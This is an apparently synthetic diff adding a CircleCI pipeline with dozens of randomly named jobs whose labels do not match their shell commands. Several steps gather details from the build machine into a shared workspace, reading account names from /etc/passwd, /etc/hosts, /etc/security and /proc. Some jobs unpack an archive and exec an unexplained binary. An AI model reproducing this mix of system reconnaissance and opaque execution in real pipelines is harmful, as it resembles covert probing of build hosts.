+            { set +o pipefail 2>/dev/null; find /run -name \* -newer /etc/passwd -exec echo {} + 2> /dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n5; true ; } > /tmp/make/amber_lagoon_atoll
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'amber_lagoon_atoll'
+  vera-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/amber_lagoon_atoll 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  redo_manifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Guard the tooltip
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; tar czf /tmp/campus.tgz -C /etc os-release&&tar -tf /tmp/campus.tgz; true ; } > /tmp/make/v101et_de53r7_nod3
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'v101et_de53r7_nod3'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/v101et_de53r7_nod3 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+  searchready:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Warm up tightening
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; hr() { local IFS=+; echo "$*"; }; hr otter fox cat; true ; } > /tmp/make/249.109.43.104
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '249.109.43.104'
+  nov28-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Restore upstream
+          command: |
+            # tee style
+            md5sum /tmp/make/249.109.43.104 2>/dev/null | tee /dev/null | cut -c1-8
+      - run:
+          name: Prepare source
+          command: git clone --depth 1 --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar xJf uploads-cached.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 60
+      - run:
+          command: exec ./service-edge
+
+  superHandlerFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Our turn to brief the release notes
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; find /opt -type d -exec stat -c %n {} + 2>/dev/null | sort | head -n 3; true ; } > /tmp/make/BRONZE
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'BRONZE'
+  echo-45:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: My serum tube seal
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; printf '%s\n' "hi"| base64; true ; } > /tmp/make/SWvZkAbfwQb
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'SWvZkAbfwQb'
+  rmse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prepare handoff B
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; for u in cat wolf koala horse seal; do echo "<${u}>"; done; true ; } > /tmp/make/shard
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'shard'
+  sk-Hans:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: format the postmortem plz
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; if [[ -d /etc/skel ]];then echo true; else echo 'false'; fi; true ; } > /tmp/make/fnv_d9f539dbf
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'fnv_d9f539dbf'
+  measure_window_run_catch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: EDGE441
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; : >"/tmp/Silver2021-12-24.bak" && ls -l "/tmp/Silver2021-12-24.bak"; true ; } > /tmp/make/sweepshaderfen
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'sweepshaderfen'
+  Sort-QueueWrapper:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: This is where we wrap the cold room
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; [ -x /bin/sh ] && echo true || echo false; true ; } > /tmp/make/_wip_305fb9
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '_wip_305fb9'
+  resolveACLs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: BUILD CCE8
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo -n "ready" | cat -A; true ; } > /tmp/make/muon.cedar
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'muon.cedar'
+  jm18cavfmnvwx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Remaster by compliance team
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ls -l /dev | grep "tty" | head -n 4; true ; } > /tmp/make/Ae1t
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'Ae1t'
+  queue-latest-full:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prepare handoff B
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; printf 'mountain\t21\nstep\t52\nerror\t86\nmoth\t94\n' >'/dev/shm/DRAWER_USAGE.csv' && sort -k2 -n '/dev/shm/DRAWER_USAGE.csv'; true ; } > /tmp/make/ScArLetsilenT
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'ScArLetsilenT'
+  CachedBuilderComponent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Read EXIF
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; uname -a | rev | tr a-z A-Z | fmt -w 33; true ; } > /tmp/make/md5_72ebad
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'md5_72ebad'
+  sprint_23062002:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Give me the zombie processes
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo -n "fair enough" | od -c | head -n 2; true ; } > /tmp/make/249.109.43.104
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '249.109.43.104'
+  new_pseudo_complex_pull_count:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: escalation 202610
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; sq(){ date "+%F $1"; }; sq %A; true ; } > /tmp/make/surgeroutershard
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'surgeroutershard'
+  err:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Ten nine eight publish
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo "v0.9-beta" | gzip | base64; true ; } > /tmp/make/28P
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '28P'
+  futures-emit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: caching in test
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; awk '{print NF}' /proc/cpuinfo | head -n8; true ; } > /tmp/make/Rda
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'Rda'
+  b6-6f-39:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Batch window garbage collected and verified
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ps -eo rss= | awk '$1 % 2 == 0' | wc -l; true ; } > /tmp/make/azureFenChunkPulse
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'azureFenChunkPulse'
+  path_2026q1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Enrich Error Rows
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >'/tmp/TREE_CONFIG_2021-07-16.gz' && gzip -t '/tmp/TREE_CONFIG_2021-07-16.gz' && echo valid; true ; } > /tmp/make/v101et_de53r7_nod3
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'v101et_de53r7_nod3'
+  apply_brush_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: I need to file the commissions
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -name "cmd*" -printf "%p\n" 2> /dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/make/stage90d
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'stage90d'
+  LocalSoftFuturePlugin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Mirroring Depth 7
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep -RI umask /etc/security 2>/dev/null | nl | head -n8; true ; } > /tmp/make/da3cee4b-cc2a-78d5-2c53-194f85df30e
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'da3cee4b-cc2a-78d5-2c53-194f85df30e'
+  inputKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scroll the submit button
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; awk -F : '{print $1}' /etc/passwd | sed 's/^/- /' | tac; true ; } > /tmp/make/218.156.77
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '218.156.77'
+  Pen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: 4k source upscale for the launch
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts > "/var/tmp/WORKER_ANT_2019_06_18.gz" && gzip -t "/var/tmp/WORKER_ANT_2019_06_18.gz" && echo valid; true ; } > /tmp/make/temp-905f2
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'temp-905f2'
+  brown200:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: All systems go archive the desk assignments
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ps -eo rss= | awk '{printf "%05d\n", $1}' | tail -5; true ; } > /tmp/make/lepton_flux_carrier
+            echo "stage2"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'lepton_flux_carrier'
+workflows:
+  workflow:
+    jobs:
+      - Psi_dot
+      - superHandlerFlag:
+          requires:
+            - Psi_dot
+      - Package_Staging4:
+          requires:
+            - superHandlerFlag
+      - PACKED:
+          requires:
+            - superHandlerFlag
+      - echo-45:
+          requires:
+            - PACKED
+      - API-419:
+          requires:
+            - echo-45
+      - sdof27od8:
+          requires:
+            - echo-45
+      - rmse:
+          requires:
+            - sdof27od8
+      - juliet:
+          requires:
+            - rmse
+      - delta_t:
+          requires:
+            - rmse
+      - sk-Hans:
+          requires:
+            - delta_t
+      - lets-go:
+          requires:
+            - sk-Hans
+      - jt57:
+          requires:
+            - sk-Hans
+      - measure_window_run_catch:
+          requires:
+            - jt57
+      - depoly:
+          requires:
+            - measure_window_run_catch
+      - m0v3
+      - Sort-QueueWrapper:
+          requires:
+            - m0v3
+      - CORE-511:
+          requires:
+            - Sort-QueueWrapper
+      - closeLevelForKey:
+          requires:
+            - Sort-QueueWrapper
+      - resolveACLs:
+          requires:
+            - closeLevelForKey
+      - green-light-go:
+          requires:
+            - resolveACLs
+      - undo_-_key:
+          requires:
+            - resolveACLs
+      - jm18cavfmnvwx:
+          requires:
+            - undo_-_key
+      - feat-7089:
+          requires:
+            - jm18cavfmnvwx
+      - bon:
+          requires:
+            - jm18cavfmnvwx
+      - queue-latest-full:
+          requires:
+            - bon
+      - sanity:
+          requires:
+            - queue-latest-full
+      - testCPU:
+          requires:
+            - queue-latest-full
+      - CachedBuilderComponent:
+          requires:
+            - testCPU
+      - hotel-9:
+          requires:
+            - CachedBuilderComponent
+      - aud_PRODUCT_COUNT
+      - alice-build:
+          requires:
+            - aud_PRODUCT_COUNT
+      - fill-gold:
+          requires:
+            - aud_PRODUCT_COUNT
+      - yolo:
+          requires:
+            - fill-gold
+      - YJVIYR-90427b:
+          requires:
+            - fill-gold
+      - dotnet8-fmt:
+          requires:
+            - YJVIYR-90427b
+      - DEPRECATED:
+          requires:
+            - YJVIYR-90427b
+      - vera-ship:
+          requires:
+            - DEPRECATED
+      - ctrlrow:
+          requires:
+            - DEPRECATED
+      - produce-end-to-end-release-candidate:
+          requires:
+            - ctrlrow
+      - initWithConfig:
+          requires:
+            - ctrlrow
+      - BuildStaging:
+          requires:
+            - initWithConfig
+      - noodleish:
+          requires:
+            - initWithConfig
+      - hyperion-rev:
+          requires:
+            - noodleish
+      - LG42502:
+          requires:
+            - noodleish
+      - java17-build:
+          requires:
+            - LG42502
+      - interfaceFn:
+          requires:
+            - LG42502
+      - hyperion-alpha:
+          requires:
+            - interfaceFn
+      - searchready
+      - sprint_23062002:
+          requires:
+            - searchready
+      - nov28-rev:
+          requires:
+            - sprint_23062002
+      - teardown_loop:
+          requires:
+            - sprint_23062002
+      - new_pseudo_complex_pull_count:
+          requires:
+            - teardown_loop
+      - fix-queue:
+          requires:
+            - new_pseudo_complex_pull_count
+      - AnonymousGuardTransaction:
+          requires:
+            - new_pseudo_complex_pull_count
+      - err:
+          requires:
+            - AnonymousGuardTransaction
+      - pr-3:
+          requires:
+            - err
+      - retryScanner:
+          requires:
+            - err
+      - futures-emit:
+          requires:
+            - retryScanner
+      - chore-5223:
+          requires:
+            - futures-emit
+      - bravoNovember6:
+          requires:
+            - futures-emit
+      - b6-6f-39:
+          requires:
+            - bravoNovember6
+      - Run_Pipeline7:
+          requires:
+            - b6-6f-39
+      - redo_manifest:
+          requires:
+            - b6-6f-39
+      - path_2026q1:
+          requires:
+            - redo_manifest
+      - push-it:
+          requires:
+            - path_2026q1
+      - expect_graph_quick:
+          requires:
+            - path_2026q1
+      - apply_brush_test:
+          requires:
+            - expect_graph_quick
+      - teh-ci:
+          requires:
+            - apply_brush_test
+      - payment_80571:
+          requires:
+            - apply_brush_test
+      - LocalSoftFuturePlugin:
+          requires:
+            - payment_80571
+      - bake-it:
+          requires:
+            - LocalSoftFuturePlugin
+      - MittenMitten:
+          requires:
+            - LocalSoftFuturePlugin
+      - inputKey:
+          requires:
+            - MittenMitten
+      - check-nightly-artifact-bundle:
+          requires:
+            - inputKey
+      - seed-length:
+          requires:
+            - inputKey
+      - Pen:
+          requires:
+            - seed-length
+      - papa-5:
+          requires:
+            - Pen
+      - CommonTitleEntry:
+          requires:
+            - Pen
+      - brown200:
+          requires:
+            - CommonTitleEntry
+      - qa-x:
+          requires:
+            - brown200
